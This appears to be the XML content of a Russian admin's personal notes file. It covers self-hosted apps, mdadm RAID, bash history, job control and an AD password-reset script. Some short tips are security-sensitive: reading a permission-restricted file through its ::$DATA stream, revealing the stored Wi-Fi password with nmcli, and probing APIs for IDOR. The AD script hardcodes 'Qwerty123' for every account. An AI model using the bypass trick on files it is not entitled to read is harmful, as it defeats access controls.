      <text:p text:style-name="P1">Audioserve (https://github.com/izderadicka/audioserve), audiobookshelf (https://github.com/advplyr/audiobookshelf) и Boringstreamer (https://github.com/fgergo/boringstreamer) - простые серверы для аудиостриминга, то есть раздачи аудиофайлов из папок (аудиокниги, музыка, подкасты).</text:p>
      <text:p text:style-name="P1">Nextcloud (https://github.com/nextcloud/server) - опенсорсная замена Google Drive и другим облачным хостингам.</text:p>
      <text:p text:style-name="P1">PhotoPrism (https://github.com/photoprism/photoprism) - хранение фотографий, красивый интерфейс для просмотра альбомов и удалённого доступа.</text:p>
      <text:p text:style-name="P1">Invidious (https://github.com/iv-org/invidious) - клиент для YouTube без трекинга и рекламы.</text:p>
      <text:p text:style-name="P1">Nitter (https://github.com/zedeus/nitter) - фронтенд для Twitter (если вы им ещё пользуетесь).</text:p>
      <text:p text:style-name="P1">Whoogle (https://github.com/benbusby/whoogle-search) - фронтенд для Google, очищенный от рекламы, скриптов, ссылок AMP, кукисов и трекинга по IP-адресам с профилированием пользователей, чем занимается Google.</text:p>
      <text:p text:style-name="P13">LibReddit (https://github.com/spikecodes/libreddit) - альтернативный приватный фронтенд для Reddit, тоже без трекинга и рекламы.</text:p>
      <text:p text:style-name="P13">SyncThing (https://github.com/syncthing) - синхронизация файлов между всеми устройствами.</text:p>
      <text:p text:style-name="P1">Code Server (https://github.com/cdr/code-server) - запуск VS Code (https://github.com/Microsoft/vscode) на сервере и удалённый доступ из браузера.</text:p>
      <text:p text:style-name="P1">Vaultwarden (https://github.com/dani-garcia/vaultwarden) - неофициальный сервер для менеджера паролей Bitwarden.</text:p>
      <text:p text:style-name="P1">Tailscale (https://github.com/tailscale/tailscale) - не требующий настройки VPN, который даёт доступ к вашему серверу из любой точки мира.</text:p>
      <text:p text:style-name="P1">Synapse (https://github.com/matrix-org/synapse) - свой инстанс Matrix для децентрализованных чатов, совместимый с клиентами Element (https://github.com/vector-im/element-web).</text:p>
      <text:p text:style-name="P1">Electrs (https://github.com/getumbrel/umbrel-electrs) - быстрый и эффективный сервер для кошелька Electrum.</text:p>
      <text:p text:style-name="P1">Gitea (https://github.com/go-gitea/gitea) - простой хостинг Git.</text:p>
      <text:p text:style-name="P7">Uptime Kuma (https://github.com/louislam/uptime-kuma) - мониторинг аптайма для своего сервера.</text:p>
      <text:p text:style-name="P1">Как прочитать файл с ограниченными правами?</text:p>
      <text:p text:style-name="P1">Грамотное использование особенностей системы и функций наследования прав может существенно затруднить получение доступа к файлам, однако на практике администраторы редко используют имеющийся в их распоряжении арсенал ограничений в полном объеме, вольно или невольно оставляя лазейки в защите.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Если вы не можете прочитать файл напрямую, попробуйте обратиться к его потоку данных. Для этого откройте каталог с файлом, в адресной строке </text:span><text:soft-page-break/><text:span text:style-name="T3">«Проводника» введите команду «cmd» и нажмите «ENTER». Так вы запустите «Командную строку» с привязкой к папке.</text:span></text:p>
      <text:p text:style-name="P1">Если файл предположительно содержит кириллические символы, сначала нужно будет изменить кодировку командой «chcp 1251». Затем выполните «more &lt; name.txt::$DATA &gt; forsave.txt», где «name.txt» - файл, который нужно прочитать, а «forsave.txt» - файл, куда будет сохранен вывод команды. В результате содержимое исходного файла будет сохранено в новом файле.</text:p>
      <text:p text:style-name="P7">Если администратор не халтурил, получить доступ к файлу описанным выше способом не получится, так как при грамотном назначении прав доступа метод обращения к объекту не будет иметь значения. Но так происходит не всегда, поэтому такой подход стоит попробовать.</text:p>
      <text:p text:style-name="P1">Шпаргалка по MDRAID:</text:p>
      <text:p text:style-name="P1">Создание массива:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --create --verbose /dev/md0 --level=1 <text:s/>--raid-devices=2 /dev/sda1 /dev/sdb1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">После чего нужно создать конфигурационный файл mdadm.conf</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --detail --scan &gt; /etc/mdadm/mdadm.conf</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">И записать изменения в загрузочный образ:</text:p>
      <text:p text:style-name="P1">update-initramfs -u</text:p>
      <text:p text:style-name="P1">Работа с массивом</text:p>
      <text:p text:style-name="P1">Пометка диска как сбойного</text:p>
      <text:p text:style-name="P13">Диск в массиве можно условно сделать сбойным, ключ --fail (-f):</text:p>
      <text:p text:style-name="P15">mdadm /dev/md0 --fail /dev/hde1</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 -f <text:s text:c="4"/>/dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Удаление сбойного диска</text:p>
      <text:p text:style-name="P1">Сбойный диск можно удалить с помощью ключа --remove (-r):</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 --remove /dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 -r <text:s text:c="6"/>/dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Добавление нового диска</text:p>
      <text:p text:style-name="P1">Добавить новый диск в массив можно с помощью ключей --add (-a) и --re-add:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 --add /dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm /dev/md0 -a <text:s text:c="3"/>/dev/hde1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Сборка существующего массива</text:p>
      <text:p text:style-name="P1">Собрать существующий массив можно с помощью mdadm --assemble. Как дополнительный аргумент указывается, нужно ли выполнять сканирование устройств, и если нет, то какие устройства нужно собирать.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --assemble /dev/md0 /dev/hde1 /dev/hdf2 /dev/hdg1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">mdadm --assemble --scan</text:p>
      <text:p text:style-name="P1">Проверить состояние массива и получить информацию и массиве</text:p>
      <text:p text:style-name="P1">Состояние массива:</text:p>
      <text:p text:style-name="P1">cat /proc/mdstat</text:p>
      <text:p text:style-name="P1">Информация о массиве:</text:p>
      <text:p text:style-name="P1">mdadm --detail /dev/md0</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Информация об элементе массива:</text:span></text:p>
      <text:p text:style-name="P1">mdadm --examine /dev/sda1</text:p>
      <text:p text:style-name="P1">Проверка целостности.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">зарускаем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">проверку</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">echo check &gt; /sys/block/md1/md/sync_action</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">смотрим</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">результат</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">~# cat /proc/mdstat</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>Personalities : [raid10] [raid1]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>md0 : active raid1 sdb1[1] sda1[0] sdc1[2] sdd1[3]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/>128384 blocks [4/4] [UUUU]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s/>md1 : active raid10 sdd2[3] sdc2[2] sda2[0] sdb2[1]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/>134222848 blocks 256K chunks 2 near-copies [4/4] [UUUU]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="7"/>[&gt;....................] <text:s/>check = <text:s/>0.5% (787072/134222848) finish=19.7min speed=112438K/sec</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Убить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">массив</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --stop /dev/md0</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">mdadm --zero-superblock /dev/sda..</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">Быстрый совет по </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">. Используйте эту команду, чтобы получить пароль к подключенной в данный момент сети </text:span><text:span text:style-name="T2">Wi</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">Fi</text:span><text:span text:style-name="T3"> '</text:span><text:span text:style-name="T2">nmcli</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">device</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">wifi</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">show</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">password</text:span><text:span text:style-name="T3">'.</text:span></text:p>
      <text:p text:style-name="P1">PowerShell скрипт смены пароля в AD у всех пользователей. Меняет всем пароль в AD и ставит галку о смене при первом входе.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Import-Module ActiveDirectory</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">$users = Get-ADUser -Filter * -SearchBase "OU=</text:span><text:span text:style-name="T3">Пользователи</text:span><text:span text:style-name="T2">,DC=flammlin,DC=local"</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">foreach ($user in $users)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">{</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$password = ConvertTo-SecureString -String "Qwerty123" -AsPlainText - Force</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Set-ADAccountPassword -Identity $user -NewPassword $password -Reset -PassThru | Set-ADuser -ChangePasswordAtLogon $True</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P7">}</text:p>
      <text:p text:style-name="P1">adduser - команда, упрощающая создание учетных записей пользователей в основанных на Debian дистрибутивах</text:p>
      <text:p text:style-name="P1">Команда adduser используется в дистрибутиве Debian для упрощения создания учетных записей пользователей, а также автоматической проверки их соотвествия политике упомянутого дистрибутива. Она реализована в виде обертки для таких утилит, как useradd, passwd и chfn и использует дополнительный файл конфигурации /etc/adduser.conf для хранения параметров, относящихся к политике дистрибутива Debian.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Примечание: в дистрибутивах, не имеющих отношения к Debian, команда adduser полностью аналогична команде useradd (если быть точнее, она представлена обычной символьной ссылкой на утилиту useradd).</text:span></text:p>
      <text:p text:style-name="P1">Базовый синтаксис команды adduser:</text:p>
      <text:p text:style-name="P1"># adduser</text:p>
      <text:p text:style-name="P1">В результате исполнения данной команды выполняются следующие операции:</text:p>
      <text:p text:style-name="P1">1- Создается учетная запись пользователя с именем .</text:p>
      <text:p text:style-name="P1">2- Создается домашняя директория пользователя /home/, в которую копируются файлы из директории /etc/skel.</text:p>
      <text:p text:style-name="P1">3- Создается группа пользователей с именем, соотвествующим имени нового пользователя, причем сам этот пользователь добавляется в нее.</text:p>
      <text:p text:style-name="P1">4- Выводится запрос ввода пароля для учетной записи пользователя.</text:p>
      <text:p text:style-name="P1">5- Выводится запрос ввода дополнительной информации, относящейся к учетной записи пользователя.</text:p>
      <text:p text:style-name="P1">Несложно догадаться, что для выполнения практически всех описанных действий может использоваться приведенная ниже последовательность команд на основе более распространенных утилит:</text:p>
      <text:p text:style-name="P1"># useradd -m -U</text:p>
      <text:p text:style-name="P1"># passwd</text:p>
      <text:p text:style-name="P1"># chfn</text:p>
      <text:p text:style-name="P1">Еще одним вариантом использования рассматриваемой команды является добавление существующего пользователя в новую группу пользователей. В этом случае используется следующий синтаксис:</text:p>
      <text:p text:style-name="P1"># adduser</text:p>
      <text:p text:style-name="P1">Данная команда также может быть заменена на более сложную команду на основе более распространенной утилиты usermod:</text:p>
      <text:p text:style-name="P1"># usermod -G , ...,</text:p>
      <text:p text:style-name="P1">Вторая команда является более сложной, но при этом и более гибкой, ведь она позволяет добавить пользователя сразу в несколько новых групп.</text:p>
      <text:p text:style-name="P1">Примеры использования</text:p>
      <text:p text:style-name="P1">Создание учетной записи пользователя iodminbook</text:p>
      <text:p text:style-name="P13"># adduser iodminbook</text:p>
      <text:p text:style-name="P13">Добавление пользователя iodminbook в группу testgroup</text:p>
      <text:p text:style-name="P7"># adduser iodminbook testgroup</text:p>
      <text:p text:style-name="P1">Горячие клавиши терминала Linux</text:p>
      <text:p text:style-name="P1">Общие:</text:p>
      <text:p text:style-name="P1">Ctrl+Alt+T - в дистрибутивах, основанных на Ubuntu это сочетание клавиш используется для открытия терминала.</text:p>
      <text:p text:style-name="P1">Tab - эта клавиша используется для автодополнения в терминале. Вам достаточно набрать начало какой-нибудь команды, затем нажать её, и команда предложит доступные варианты или завершит её если она одна.</text:p>
      <text:p text:style-name="P1">Ctrl+L - очистить весь вывод терминала.</text:p>
      <text:p text:style-name="P1">Ctrl+S - приостановить вывод терминала.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Ctrl+Q - возобновить вывод если он был приостановлен.</text:span></text:p>
      <text:p text:style-name="P1">Ctrl+C - отправить команде сигнал SigInt для её завершения.</text:p>
      <text:p text:style-name="P1">Ctrl+Z - свернуть текущую команду в фоновый режим.</text:p>
      <text:p text:style-name="P1">История команд:</text:p>
      <text:p text:style-name="P1">Стрелки вверх и вниз - используются для перемещения вперед и назад по истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+r - можно использовать для поиска по истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+p - предыдущая команда в истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+n - следующая команда в истории команд.</text:p>
      <text:p text:style-name="P1">Ctrl+g - если вы находитесь в режиме поиска, завершает поиск.</text:p>
      <text:p text:style-name="P1">Ctrl+o - выполнить найденную поиском команду.</text:p>
      <text:p text:style-name="P1">Alt+. - использовать последнее слово предыдущей команды.</text:p>
      <text:p text:style-name="P1">Перемещение курсора:</text:p>
      <text:p text:style-name="P1">Ctrl+a - перейти в начало строки.</text:p>
      <text:p text:style-name="P1">Ctrl+e - перейти в конец строки.</text:p>
      <text:p text:style-name="P1">Alt+b - перейти влево на одно слово.</text:p>
      <text:p text:style-name="P1">Alt+f - перейти в право на одно слово.</text:p>
      <text:p text:style-name="P1">Ctrl+b - перейти влево на один символ.</text:p>
      <text:p text:style-name="P1">Ctrl+f - перейти вправо на один символ.</text:p>
      <text:p text:style-name="P1">Ctrl+xx - перейти в конец или в начало строки.</text:p>
      <text:p text:style-name="P1">Редактирование:</text:p>
      <text:p text:style-name="P1">Ctrl+u - вырезать строку до позиции курсора.</text:p>
      <text:p text:style-name="P1">Alt+Del - удалить слово перед курсором.</text:p>
      <text:p text:style-name="P1">Alt+d - удалить слово после курсора.</text:p>
      <text:p text:style-name="P1">Ctrl+d - удалить символ под курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+h - удалить символ под курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+w - вырезать слово под курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+k - вырезать строку от позиции курсора до конца строки</text:p>
      <text:p text:style-name="P1">Alt+t - поменять текущее слово с предыдущим.</text:p>
      <text:p text:style-name="P1">Ctrl+t - поменять местами два символа перед курсором.</text:p>
      <text:p text:style-name="P1">Esc+t - поменять местами два слова перед курсором.</text:p>
      <text:p text:style-name="P1">Ctrl+y - вставить то, что было вырезано.</text:p>
      <text:p text:style-name="P13">Alt+u - сделать верхний регистр символов от позиции курсора до конца текущего слова.</text:p>
      <text:p text:style-name="P13">Alt+l - сделать нижний регистр символов от позиции курсора до конца слова.</text:p>
      <text:p text:style-name="P1">Alt+c - перевести символ под курсором в верхний регистр и перейти к концу слова.</text:p>
      <text:p text:style-name="P1">Alt+r - вернуть строку в исходное состояние.</text:p>
      <text:p text:style-name="P7">Ctrl+_ - отменить последнее действие со строкой.</text:p>
      <text:p text:style-name="P1">Совет по тестированию API</text:p>
      <text:p text:style-name="P1">У большинства API есть конечная точка для создания, удаления, обновления и чтения объекта или группы объектов. </text:p>
      <text:p text:style-name="P1">Если вы видите:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">DELETE /api/item/32 (удаление)</text:span></text:p>
      <text:p text:style-name="P1">То попробуйте:</text:p>
      <text:p text:style-name="P1">POST /api/item (создание)</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">GET /api/item/33 (</text:span><text:span text:style-name="T3">чтение</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">PUT /api/item/33 (</text:span><text:span text:style-name="T3">обновление</text:span><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P1">Затем протестируйте каждый из них на IDOR, поочередно проверяя аутентификацию и уровни доступа к различным объектам. Методологическое тестирование - лучший способ взломать API.</text:p>
      <text:p text:style-name="P7">Иногда тестирование API усложняется тем, что мы можем не знать нужные для запроса поля или параметры. Однако есть способы найти их, например: если вы знаете поля для GET, вы так же можете отправить и PUT, изменив некоторые значения. Кроме того, есть инструменты, такие как Arjun (https://github.com/s0md3v/Arjun), которые могут находить параметры, а иногда и сами API просто возвращают сообщения об ошибках, когда какой-то из параметров отсутствует.</text:p>
      <text:p text:style-name="P1">Советы по настройке history команд в Bash:</text:p>
      <text:p text:style-name="P1">Каждая вводимая в терминале команда сохраняется в файле ~/.bash_history. Чтобы посмотреть историю команд - введите history.</text:p>
      <text:p text:style-name="P1">Настройка истории команд в Bash осуществляется путем добавления переменных окружения в файл ~/.bashrc.</text:p>
      <text:p text:style-name="P1">Чтобы изменения в ~/.bashrc вступили в силу, выполните:</text:p>
      <text:p text:style-name="P1">source ~/.bashrc</text:p>
      <text:p text:style-name="P1">1. Добавляем Отображение Даты и Времени в Bash History</text:p>
      <text:p text:style-name="P1">Иногда очень полезно узнать время, когда какая-либо команда была выполнена.</text:p>
      <text:p text:style-name="P1">Установите HISTTIMEFORMAT, чтобы сохранять время выполнения каждой команды.</text:p>
      <text:p text:style-name="P1">Для этого добавьте следующую строку в файл ~/.bashrc:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">export HISTTIMEFORMAT="%h %d %H:%M:%S "</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Теперь, набрав history, Вы получите следующий вывод:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">113 <text:s/>Jun 08 16:31:06 sudo ifconfig</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">114 <text:s/>Jun 08 16:31:10 top</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">115 <text:s/>Jun 08 16:31:19 ping disnetern.ru</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">116 <text:s/>Jun 08 16:31:22 history</text:p>
      <text:p text:style-name="P1">2. Увеличиваем Размер Хранимой Истории</text:p>
      <text:p text:style-name="P1">Увеличьте HISTSIZE - количество команд, которые необходимо запоминать в списке истории (стандартное значение - 500).</text:p>
      <text:p text:style-name="P13">export HISTSIZE=5000</text:p>
      <text:p text:style-name="P13">Увеличьте HISTFILESIZE - максимальное количество строк, содержащееся в файле истории (стандартное значение - 500).</text:p>
      <text:p text:style-name="P1">export HISTFILESIZE=5000</text:p>
      <text:p text:style-name="P1">3. Добавляем Команды Bash в Файл с Историей</text:p>
      <text:p text:style-name="P1">Bash перезаписывает файл .bash_history?</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Чтобы добавлять новые команды в файл с историей, а не переписывать его каждый раз, добавьте следующую строку в ~/.bashrc:</text:span></text:p>
      <text:p text:style-name="P1">shopt -s histappend</text:p>
      <text:p text:style-name="P1">4. Мгновенно Сохранять Историю Команд</text:p>
      <text:p text:style-name="P1">По умолчанию, Bash записывает историю команд в .bash_history, при завершении сессии.</text:p>
      <text:p text:style-name="P1">Если сессия внезапно оборвется Вы потеряете текущую историю команд.</text:p>
      <text:p text:style-name="P1">Используйте переменную $PROMPT_COMMAND, чтобы сохранять команды сразу после выполнения:</text:p>
      <text:p text:style-name="P1">Добавьте следующую строку в файл ~/.bashrc, если переменная $PROMPT_COMMAND не была задана ранее:</text:p>
      <text:p text:style-name="P1">PROMPT_COMMAND='history -a'</text:p>
      <text:p text:style-name="P1">Добавьте следующую строку, если переменная $PROMPT_COMMAND уже была задана:</text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">PROMPT_COMMAND='$PROMPT_COMMAND; history -a'</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">ChatGPT расширения:</text:p>
      <text:p text:style-name="P1">1. https://github.com/HorrorPills/ChatGPT-Gnome-Desktop-Extension - встраивает ChatGPT в Linux среду окружения Gnome.</text:p>
      <text:p text:style-name="P1">2. https://chrome.google.com/webstore/detail/chatgpt-for-google/jgjaeacdkonaoafenlfkkkmbaopkbilf - расширение для Google Chrome.</text:p>
      <text:p text:style-name="P1">3. https://github.com/wong2/chat-gpt-google-extension - интеграция этой нейросети в поисковые системы Google, Baidu, Bing, DuckDuckGo, Brave, Yahoo, Naver, Yandex, Kagi, Searx;</text:p>
      <text:p text:style-name="P1">4. https://chrome.google.com/webstore/detail/promptheus-converse-with/eipjdkbchadnamipponehljdnflolfki - подключает ИИ к голосовому помощнику;</text:p>
      <text:p text:style-name="P4">5. https://github.com/altryne/chatGPT-telegram-bot/ - помогает создать Telegram бота на ChatGPT;</text:p>
      <text:p text:style-name="P1">Запуск команд в фоновом режиме, синтаксис:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Задачу (например, команду или скрипт) можно перевести в фоновый режим, добавив символ «&amp;» в конец командной строки. Этот оператор переводит команду в фоновый режим и освобождает место в терминале. Команда, выполняемая в фоновом режиме, называется заданием. Во время работы фоновой команды можно выполнять любые другие команды.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command &amp; script-name &amp; /path/to/command arg1 arg2 &amp; command-1 | command-2 arg1 &amp; command-1 | command-2 -arg1 -arg2 &gt;/path/to/output &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Примеры</text:p>
      <text:p text:style-name="P1">Чтобы перевести команду ls в фоновый режим, введите:</text:p>
      <text:p text:style-name="P1">$ ls *.py &gt; output.txt &amp;</text:p>
      <text:p text:style-name="P17">Чтобы перевести следующую команду поиска в фоновый режим, добавьте символ «&amp;» в конец командной строки:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">find . -iname "*.mp3" &gt; myplaylist.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как найти задания, работающие в фоновом режиме? Выполните следующую команду:</text:p>
      <text:p text:style-name="P1">jobs</text:p>
      <text:p text:style-name="P1">Пример вывода данных:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[1]- <text:s/>Running <text:s text:c="16"/>find / -iname "*.c" 2&gt; /dev/null &gt; /tmp/output.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">[2]+ <text:s/>Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Где</text:p>
      <text:p text:style-name="P1">[1] и [2] идентификаторы заданий.</text:p>
      <text:p text:style-name="P1">Чтобы отобразить идентификаторы процессов для идентификаторов заданий помимо стандартных сведений, передайте параметр -l:</text:p>
      <text:p text:style-name="P1">jobs -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pan text:style-name="T2">[2]+ <text:s/>7324 Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Чтобы отобразить только идентификаторы процессов, введите:</text:p>
      <text:p text:style-name="P1">jobs -p</text:p>
      <text:p text:style-name="P1">Пример вывода данных:</text:p>
      <text:p text:style-name="P1">7307</text:p>
      <text:p text:style-name="P1">7324</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Как прекратить выполнение заданий, работающих в фоновом режиме? Для принудительного или постепенного завершения процесса следует использовать команду kill.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kill PID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill -15 PID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill -9 PID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">killall process-Name-Here</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">killall -15 process-Name-Here</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">killall -9 process-Name-Here</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как переместить процесс из фонового режима в приоритетный?</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Синтаксис</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">%JOB-ID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">ИЛИ</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">fg JOB-ID</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Сначала следует вывести список текущих заданий с помощью команды jobs. Для этого введите:</text:p>
      <text:p text:style-name="P1">jobs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oft-page-break/><text:span text:style-name="T2">[2]+ <text:s/>7324 Running <text:s text:c="16"/>grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt &amp;</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Чтобы перевести задание job id #2 в приоритетный режим, введите:</text:p>
      <text:p text:style-name="P1">%2</text:p>
      <text:p text:style-name="P1">ИЛИ используйте команду:</text:p>
      <text:p text:style-name="P13">fg 2</text:p>
      <text:p text:style-name="P13">Пример вывода данных:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">grep -R "hostNamed" / 2&gt; /dev/null &gt; /tmp/grep.txt</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Чтобы перевести это задание обратно в фоновый режим, нажмите клавишу Z, удерживая клавишу CTRL. При этом выполнение текущего приоритетного задания будет приостановлено. Введите следующую команду, чтобы перевести задание в фоновый режим:</text:p>
      <text:p text:style-name="P1">%2 &amp;</text:p>
      <text:p text:style-name="P1">ИЛИ используйте команду:</text:p>
      <text:p text:style-name="P1">bg</text:p>
      <text:p text:style-name="P7">Теперь командное задание grep будет работать в фоновом режиме.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">kill Linux:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Syn: kill {option} {PID}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Search PID: pidof {name program} or use "top, htop"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">Example: kill {-1: reboot process, -9: kill process, -15: terminate process} {PID process} or {$(pidof{name program}}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">Win+Ctrl+Shift+B - </text:span><text:span text:style-name="T3">перезапускает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">видеодрайвер</text:span></text:p>
      <text:p text:style-name="P1">Powershell суточный отчет по пользователям из ActiveDirectory. Раз в сутки (через планировщик задач) скрипт опрашивает ActiveDirectory на предмет: Всего пользователей, Сколько активных, Сколько служебных, Сколько заблокированных, Сколько новых</text:p>
